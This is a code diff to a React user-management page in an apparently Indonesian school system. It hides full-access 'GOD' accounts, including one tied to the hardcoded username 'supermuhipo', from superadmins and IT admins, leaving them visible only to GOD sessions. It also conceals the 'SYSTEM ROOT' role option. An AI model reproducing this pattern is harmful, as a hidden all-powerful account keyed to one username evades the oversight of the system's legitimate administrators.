@@ -515,9 +515,7 @@ export default function UsersPage() {
   const [pageSize, setPageSize] = useState<number>(10)
   const { data: session } = useSession()
   const currentUser = session?.user as any
-  const isSuperadminOrGod =
-    currentUser?.role === 'SUPERADMIN' ||
-    currentUser?.role === 'ADMIN_IT' ||
+  const isGodUserSession =
     currentUser?.role === 'GOD' ||
     currentUser?.role === 'GOD_USER' ||
     currentUser?.username === 'supermuhipo'
@@ -525,14 +523,14 @@ export default function UsersPage() {
   // Filter khusus akun pegawai, guru, admin, dan pengelola internal (tidak menampilkan wali murid atau siswa)
   const staffUsers = useMemo(() => (users || []).filter(u => {
     if (['WALI_MURID', 'SISWA'].includes(u.role)) return false
-    // Akun GOD User hanya boleh terlihat dan dikelola jika yang login adalah Superadmin atau GOD User
-    if ((u.role === 'GOD' || u.role === 'GOD_USER' || u.username === 'supermuhipo') && !isSuperadminOrGod) {
+    // Akun GOD User disembunyikan total di publik & superadmin biasa, hanya terlihat oleh akun GOD itu sendiri
+    if ((u.role === 'GOD' || u.role === 'GOD_USER' || u.username === 'supermuhipo') && !isGodUserSession) {
       return false
     }
     if (filterStatus === 'ACTIVE') return u.isActive !== false
     if (filterStatus === 'INACTIVE') return u.isActive === false
     return true
-  }), [users, filterStatus, isSuperadminOrGod])
+  }), [users, filterStatus, isGodUserSession])
 
   const filteredUsers = useMemo(() => filterDataBySearch(staffUsers, searchQuery) || [], [staffUsers, searchQuery])
 
@@ -753,7 +751,9 @@ export default function UsersPage() {
                       <SelectItem value="KEPALA_SEKOLAH">KEPALA SEKOLAH</SelectItem>
                       <SelectItem value="ADMIN_IT">ADMIN IT</SelectItem>
                       <SelectItem value="SUPERADMIN">SUPERADMIN</SelectItem>
-                      <SelectItem value="GOD_USER">GOD ACCESS (Akses Penuh Semua Modul)</SelectItem>
+                      {(currentUser?.role === 'GOD' || currentUser?.role === 'GOD_USER' || currentUser?.username === 'supermuhipo') && (
+                        <SelectItem value="GOD_USER">SYSTEM ROOT (Akses Penuh Semua Modul)</SelectItem>
+                      )}
                     </SelectContent>
                   </Select>
                 </div>
